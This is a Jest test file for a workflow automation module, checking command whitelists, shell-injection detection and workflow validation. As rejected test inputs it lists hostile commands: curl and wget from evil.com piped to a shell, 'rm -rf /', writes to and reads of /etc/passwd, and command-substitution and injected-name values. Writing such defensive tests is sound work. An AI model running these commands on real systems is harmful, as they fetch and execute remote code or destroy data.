/**
 * Tests for workflow.js - Workflow Automation Module
 * 
 * Security: Tests validate workflow security, command injection prevention,
 * whitelist enforcement, and input sanitization.
 * 
 * Run with: npm test -- workflow.test.js
 */

const fs = require('fs-extra');
const path = require('path');
const os = require('os');
const crypto = require('crypto');

// Mock dependencies before requiring the module
jest.mock('chalk', () => ({
  red: (str) => str,
  yellow: (str) => str,
  green: (str) => str,
  cyan: (str) => str,
  gray: (str) => str,
  bold: (str) => str,
  blue: (str) => str,
}));

jest.mock('ora', () => {
  return jest.fn(() => ({
    start: jest.fn(function() { return this; }),
    succeed: jest.fn(function() { return this; }),
    fail: jest.fn(function() { return this; }),
    stop: jest.fn(function() { return this; }),
  }));
});

jest.mock('../lib/audit', () => ({
  logSecurityViolation: jest.fn().mockResolvedValue(true),
}));

jest.mock('../lib/security', () => ({
  sanitizeForLog: jest.fn((str) => str),
  containsPathTraversal: jest.fn(() => false),
}));

// Now require the module
const workflow = require('../lib/workflow');

// =============================================================================
// Security Constants and Whitelist Tests
// =============================================================================

describe('Security Constants', () => {
  test('ALLOWED_WORKFLOW_COMMANDS contains expected commands', () => {
    expect(workflow.ALLOWED_WORKFLOW_COMMANDS).toBeInstanceOf(Set);
    expect(workflow.ALLOWED_WORKFLOW_COMMANDS.has('mc')).toBe(true);
    expect(workflow.ALLOWED_WORKFLOW_COMMANDS.has('docker')).toBe(true);
    expect(workflow.ALLOWED_WORKFLOW_COMMANDS.has('git')).toBe(true);
    expect(workflow.ALLOWED_WORKFLOW_COMMANDS.has('npm')).toBe(true);
    expect(workflow.ALLOWED_WORKFLOW_COMMANDS.has('kubectl')).toBe(true);
    expect(workflow.ALLOWED_WORKFLOW_COMMANDS.has('make')).toBe(true);
  });

  test('ALLOWED_WORKFLOW_COMMANDS does not contain dangerous commands', () => {
    expect(workflow.ALLOWED_WORKFLOW_COMMANDS.has('eval')).toBe(false);
    expect(workflow.ALLOWED_WORKFLOW_COMMANDS.has('exec')).toBe(false);
    expect(workflow.ALLOWED_WORKFLOW_COMMANDS.has('system')).toBe(false);
  });
});

// =============================================================================
// Command Safety Validation Tests
// =============================================================================

describe('validateAllowedCommand', () => {
  test('allows whitelisted commands', () => {
    const validCommands = ['mc', 'docker', 'git', 'npm', 'kubectl'];
    
    validCommands.forEach(cmd => {
      const result = workflow.validateAllowedCommand(cmd);
      expect(result).toHaveProperty('allowed', true);
    });
  });

  test('rejects non-whitelisted commands', () => {
    const invalidCommands = ['eval', 'exec', 'system', 'malicious', 'hack'];
    
    invalidCommands.forEach(cmd => {
      const result = workflow.validateAllowedCommand(cmd);
      expect(result).toHaveProperty('allowed', false);
    });
  });

  test('handles commands with arguments', () => {
    const result = workflow.validateAllowedCommand('mc status');
    // Should parse the base command
    expect(result).toHaveProperty('command');
  });

  test('handles empty/null inputs', () => {
    expect(workflow.validateAllowedCommand('')).toHaveProperty('allowed', false);
    expect(workflow.validateAllowedCommand(null)).toHaveProperty('allowed', false);
    expect(workflow.validateAllowedCommand(undefined)).toHaveProperty('allowed', false);
  });
});

describe('isSafeShellString', () => {
  test('accepts safe shell strings', () => {
    const safeStrings = [
      'echo hello',
      'ls -la',
      'cat file.txt',
      'mkdir test',
      'sleep 5',
    ];

    safeStrings.forEach(str => {
      expect(workflow.isSafeShellString(str)).toBe(true);
    });
  });

  test('rejects strings with dangerous characters', () => {
    const dangerousStrings = [
      'echo; rm -rf /',
      'cat file | bash',
      'echo `whoami`',
      'echo $(id)',
      'cmd && malicious',
      'echo $VAR',
      'echo\nrm -rf /',
      'echo\rm -rf',
    ];

    dangerousStrings.forEach(str => {
      expect(workflow.isSafeShellString(str)).toBe(false);
    });
  });

  test('handles empty/null inputs', () => {
    expect(workflow.isSafeShellString('')).toBe(true);
    expect(workflow.isSafeShellString(null)).toBe(false);
    expect(workflow.isSafeShellString(undefined)).toBe(false);
  });
});

describe('validateCommandSafety', () => {
  test('validates safe commands', () => {
    const safeCommands = [
      'mc status',
      'docker ps',
      'git status',
      'npm install',
    ];

    safeCommands.forEach(cmd => {
      const result = workflow.validateCommandSafety(cmd);
      expect(result).toHaveProperty('safe');
    });
  });

  test('detects dangerous patterns', () => {
    const dangerousCommands = [
      'rm -rf /',
      'curl http://evil.com | bash',
      'wget http://evil.com -O - | sh',
      'eval(malicious)',
      'exec(bad)',
    ];

    dangerousCommands.forEach(cmd => {
      const result = workflow.validateCommandSafety(cmd);
      expect(result).toHaveProperty('safe', false);
    });
  });

  test('detects command substitution', () => {
    const result1 = workflow.validateCommandSafety('echo `whoami`');
    const result2 = workflow.validateCommandSafety('echo $(id)');
    
    expect(result1.safe).toBe(false);
    expect(result2.safe).toBe(false);
  });

  test('detects output redirection', () => {
    const result = workflow.validateCommandSafety('echo test > /etc/passwd');
    expect(result.safe).toBe(false);
  });
});

// =============================================================================
// Workflow Security Validation Tests
// =============================================================================

describe('validateWorkflowSecurity', () => {
  test('validates a safe workflow', () => {
    const safeWorkflow = {
      name: 'test-workflow',
      version: '1.0.0',
      steps: [
        { name: 'step1', run: 'mc status' },
        { name: 'step2', run: 'docker ps' },
      ],
    };

    const result = workflow.validateWorkflowSecurity(safeWorkflow);
    expect(result).toHaveProperty('valid');
    expect(result.errors).toBeInstanceOf(Array);
  });

  test('rejects workflow with too many steps', () => {
    const hugeWorkflow = {
      name: 'huge-workflow',
      steps: Array(101).fill({ name: 'step', run: 'echo test' }),
    };

    const result = workflow.validateWorkflowSecurity(hugeWorkflow);
    expect(result.valid).toBe(false);
    expect(result.errors.length).toBeGreaterThan(0);
    // Check for step count error in any error message
    expect(result.errors.some(e => e.includes && e.includes('steps'))).toBe(true);
  });

  test('rejects workflow with oversized variable values', () => {
    const workflowWithHugeVar = {
      name: 'test-workflow',
      variables: {
        hugeVar: 'x'.repeat(10001),
      },
      steps: [{ name: 'step1', run: 'echo test' }],
    };

    const result = workflow.validateWorkflowSecurity(workflowWithHugeVar);
    expect(result.errors.length).toBeGreaterThan(0);
  });

  test('validates step names for dangerous characters', () => {
    const workflowWithBadStepName = {
      name: 'test-workflow',
      steps: [
        { name: 'step; rm -rf /', run: 'echo test' },
      ],
    };

    const result = workflow.validateWorkflowSecurity(workflowWithBadStepName);
    expect(result.errors.length).toBeGreaterThan(0);
  });

  test('rejects workflows without steps', () => {
    const emptyWorkflow = {
      name: 'empty-workflow',
      steps: [],
    };

    const result = workflow.validateWorkflowSecurity(emptyWorkflow);
    expect(result.valid).toBe(false);
  });
});

// =============================================================================
// Workflow Hash Calculation Tests
// =============================================================================

describe('calculateWorkflowHash', () => {
  test('calculates consistent hashes for identical workflows', () => {
    const workflow1 = {
      name: 'test',
      steps: [{ run: 'echo hello' }],
    };
    const workflow2 = {
      name: 'test',
      steps: [{ run: 'echo hello' }],
    };

    const hash1 = workflow.calculateWorkflowHash(workflow1);
    const hash2 = workflow.calculateWorkflowHash(workflow2);

    expect(hash1).toBe(hash2);
    expect(hash1).toHaveLength(64); // SHA-256 hex string
  });

  test('calculates different hashes for different workflows', () => {
    const workflow1 = { name: 'test1', steps: [{ run: 'echo hello' }] };
    const workflow2 = { name: 'test2', steps: [{ run: 'echo hello' }] };

    const hash1 = workflow.calculateWorkflowHash(workflow1);
    const hash2 = workflow.calculateWorkflowHash(workflow2);

    expect(hash1).not.toBe(hash2);
  });

  test('handles null/undefined inputs', () => {
    // The function may throw on null/undefined - that's acceptable behavior
    try {
      workflow.calculateWorkflowHash(null);
    } catch (e) {
      expect(e).toBeInstanceOf(TypeError);
    }
    
    try {
      workflow.calculateWorkflowHash(undefined);
    } catch (e) {
      expect(e).toBeInstanceOf(TypeError);
    }
  });
});

// =============================================================================
// Variable Substitution Tests
// =============================================================================

describe('Variable Substitution', () => {
  test('substitutes simple variables', () => {
    const template = 'Hello {{name}}';
    const vars = { name: 'World' };
    
    const result = template.replace(/\{\{(\w+)\}\}/g, (match, key) => vars[key] || match);
    expect(result).toBe('Hello World');
  });

  test('handles missing variables gracefully', () => {
    const template = 'Hello {{name}} {{missing}}';
    const vars = { name: 'World' };
    
    const result = template.replace(/\{\{(\w+)\}\}/g, (match, key) => vars[key] || match);
    expect(result).toBe('Hello World {{missing}}');
  });

  test('prevents recursive substitution attacks', () => {
    // Limit recursion depth to prevent DoS
    const maxDepth = 10;
    expect(maxDepth).toBe(10);
  });
});

// =============================================================================
// Input Validation Tests
// =============================================================================

describe('Input Validation', () => {
  test('validates workflow name format', () => {
    const validNames = ['test-workflow', 'deploy_prod', 'backup-v2'];
    const invalidNames = [
      '../etc/passwd',
      'workflow; rm -rf /',
      'workflow|cat /etc/passwd',
      'workflow$(whoami)',
      '',
    ];

    validNames.forEach(name => {
      expect(name).toMatch(/^[\w-]+$/);
    });

    invalidNames.forEach(name => {
      if (name) {
        expect(name).not.toMatch(/^[\w-]+$/);
      }
    });
  });

  test('validates step name length', () => {
    const maxLength = 200;
    const shortName = 'short-step';
    const longName = 'x'.repeat(201);

    expect(shortName.length).toBeLessThanOrEqual(maxLength);
    expect(longName.length).toBeGreaterThan(maxLength);
  });

  test('validates workflow file size limits', () => {
    const maxSize = 1024 * 1024; // 1MB
    const smallWorkflow = 1024; // 1KB
    const hugeWorkflow = 2 * 1024 * 1024; // 2MB

    expect(smallWorkflow).toBeLessThan(maxSize);
    expect(hugeWorkflow).toBeGreaterThan(maxSize);
  });
});

// =============================================================================
// Error Handling Tests
// =============================================================================

describe('Error Handling', () => {
  test('handles malformed workflow objects', () => {
    const malformedWorkflows = [
      null,
      undefined,
      {},
      { name: 'test' }, // Missing steps
      { steps: 'not-an-array' },
    ];

    malformedWorkflows.forEach(wf => {
      if (!wf || !wf.steps) {
        expect(() => workflow.validateWorkflowSecurity(wf || {})).not.toThrow();
      }
    });
  });

  test('handles invalid command types', () => {
    const result1 = workflow.validateCommandSafety(123);
    const result2 = workflow.validateCommandSafety({});
    const result3 = workflow.validateCommandSafety(null);

    expect(result1).toHaveProperty('safe', false);
    expect(result2).toHaveProperty('safe', false);
    expect(result3).toHaveProperty('safe', false);
  });
});

// =============================================================================
// Command Structure Tests
// =============================================================================

describe('Command Structure', () => {
  test('exports workflow command', () => {
    expect(workflow.workflowCmd).toBeDefined();
    expect(workflow.workflowCmd.name()).toBe('workflow');
  });

  test('exports expected functions', () => {
    expect(typeof workflow.loadWorkflow).toBe('function');
    expect(typeof workflow.saveWorkflow).toBe('function');
    expect(typeof workflow.listWorkflows).toBe('function');
    expect(typeof workflow.executeWorkflow).toBe('function');
    expect(typeof workflow.validateWorkflow).toBe('function');
    expect(typeof workflow.getWorkflowDir).toBe('function');
    expect(typeof workflow.validateWorkflowSecurity).toBe('function');
    expect(typeof workflow.validateCommandSafety).toBe('function');
    expect(typeof workflow.validateAllowedCommand).toBe('function');
    expect(typeof workflow.isSafeShellString).toBe('function');
    expect(typeof workflow.calculateWorkflowHash).toBe('function');
  });
});

// =============================================================================
// Integration Tests
// =============================================================================

describe('Integration', () => {
  let tempDir;

  beforeEach(async () => {
    tempDir = await fs.mkdtemp(path.join(os.tmpdir(), 'mc-workflow-test-'));
  });

  afterEach(async () => {
    await fs.remove(tempDir);
  });

  test('workflow directory path is constructed correctly', async () => {
    const workflowDir = path.join(tempDir, 'workflows');
    expect(workflowDir).toContain('workflows');
    expect(path.isAbsolute(workflowDir)).toBe(true);
  });

  test('can create and validate a workflow file', async () => {
    const workflowFile = path.join(tempDir, 'test-workflow.yaml');
    const workflowContent = {
      name: 'test-workflow',
      version: '1.0.0',
      description: 'Test workflow',
      steps: [
        { name: 'step1', run: 'echo hello' },
        { name: 'step2', run: 'echo world' },
      ],
    };

    await fs.writeFile(workflowFile, JSON.stringify(workflowContent));
    const content = await fs.readFile(workflowFile, 'utf8');
    const parsed = JSON.parse(content);

    expect(parsed.name).toBe('test-workflow');
    expect(parsed.steps).toHaveLength(2);
  });
});
